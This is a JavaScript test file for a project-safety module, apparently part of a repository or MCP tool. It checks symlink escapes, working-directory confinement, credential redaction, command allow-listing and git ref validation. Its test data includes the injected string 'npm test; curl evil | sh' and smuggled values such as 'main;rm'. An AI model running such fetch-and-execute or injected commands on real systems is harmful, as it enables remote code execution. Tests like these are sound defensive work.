import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  existsSafe,
  isSafeRef,
  readFileSafe,
  resolveAllowedCommand,
  runCommand,
  CommandNotAllowedError,
  UnsafeWorkingDirectoryError,
  MAX_FILE_BYTES,
} from "../dist/index.js";

/**
 * The boundaries an adversarial repository or MCP caller must not cross.
 * Symlink tests are skipped where the platform refuses to create links
 * (Windows without developer mode) - honestly, not silently.
 */

function scratch() {
  const base = mkdtempSync(join(tmpdir(), "project-surface-safety-"));
  const root = join(base, "repo");
  const outside = join(base, "outside");
  mkdirSync(root);
  mkdirSync(outside);
  writeFileSync(join(outside, "secret.txt"), "the secret");
  writeFileSync(join(root, "inside.txt"), "fine");
  return { base, root, outside };
}

function tryLink(target, path, type) {
  try {
    symlinkSync(target, path, type);
    return true;
  } catch {
    return false;
  }
}

test("a file inside the project is readable", () => {
  const { base, root } = scratch();
  try {
    assert.equal(readFileSafe(root, "inside.txt"), "fine");
    assert.equal(existsSafe(root, "inside.txt"), true);
    assert.equal(existsSafe(root, "missing.txt"), false);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("a symlink pointing outside the project is never followed", (t) => {
  const { base, root, outside } = scratch();
  try {
    if (!tryLink(join(outside, "secret.txt"), join(root, "leak.txt"), "file")) {
      return t.skip("symlinks not permitted on this machine");
    }
    assert.equal(readFileSafe(root, "leak.txt"), null);
    assert.equal(existsSafe(root, "leak.txt"), false);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("a symlinked directory pointing outside the project is never traversed", (t) => {
  const { base, root, outside } = scratch();
  try {
    if (!tryLink(outside, join(root, "vendor"), "junction")) {
      return t.skip("symlinks not permitted on this machine");
    }
    assert.equal(readFileSafe(root, "vendor/secret.txt"), null);
    assert.throws(
      () => runCommand(root, { id: "x", run: "echo hi", cwd: "vendor", kind: "other", provenance: {} }, { now: "2026-01-01T00:00:00Z" }),
      UnsafeWorkingDirectoryError
    );
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("a working directory outside the project is refused", () => {
  const { base, root } = scratch();
  try {
    const command = { id: "x", run: "echo hi", cwd: "../outside", kind: "other", provenance: {} };
    assert.throws(() => runCommand(root, command, { now: "2026-01-01T00:00:00Z" }), UnsafeWorkingDirectoryError);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("a credential inherited from the environment never reaches the recorded summary", () => {
  const { base, root } = scratch();
  const value = "hunter2-value-" + Date.now();
  process.env.PROJECT_SURFACE_TEST_API_KEY = value;
  try {
    const run = process.platform === "win32"
      ? "echo leak=%PROJECT_SURFACE_TEST_API_KEY% && echo %PROJECT_SURFACE_TEST_API_KEY%"
      : "echo leak=$PROJECT_SURFACE_TEST_API_KEY && echo $PROJECT_SURFACE_TEST_API_KEY";
    const record = runCommand(
      root,
      { id: "x", run, cwd: ".", kind: "other", provenance: {} },
      { now: "2026-01-01T00:00:00Z" }
    );
    assert.equal(record.status, "passed");
    assert.ok(record.summary, "the command printed something");
    assert.ok(!record.summary.includes(value), record.summary);
  } finally {
    delete process.env.PROJECT_SURFACE_TEST_API_KEY;
    rmSync(base, { recursive: true, force: true });
  }
});

test("only commands present in the document can be resolved", () => {
  const surface = { commands: [{ id: "test", run: "npm test", cwd: ".", kind: "test" }] };
  assert.equal(resolveAllowedCommand(surface, "test").run, "npm test");
  assert.throws(() => resolveAllowedCommand(surface, "npm test; curl evil | sh"), CommandNotAllowedError);
  assert.throws(() => resolveAllowedCommand(surface, "--help"), CommandNotAllowedError);
});

test("git refs that would be parsed as options are rejected", () => {
  for (const ok of ["HEAD", "main", "v1.2.3", "HEAD~3", "origin/main", "abc123", "feature/x-y_z"]) {
    assert.equal(isSafeRef(ok), true, ok);
  }
  for (const bad of ["--output=/tmp/x", "-v", "", "HEAD..main", "a b", "main;rm", "HEAD@{1}"]) {
    assert.equal(isSafeRef(bad), false, bad);
  }
});

test("a file over the size cap is not read, a normal one is", () => {
  const { base, root } = scratch();
  try {
    writeFileSync(join(root, "huge.txt"), Buffer.alloc(MAX_FILE_BYTES + 1, 0x61));
    assert.equal(readFileSafe(root, "huge.txt"), null);
    assert.equal(existsSafe(root, "huge.txt"), true);
    assert.equal(readFileSafe(root, "inside.txt"), "fine");
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});
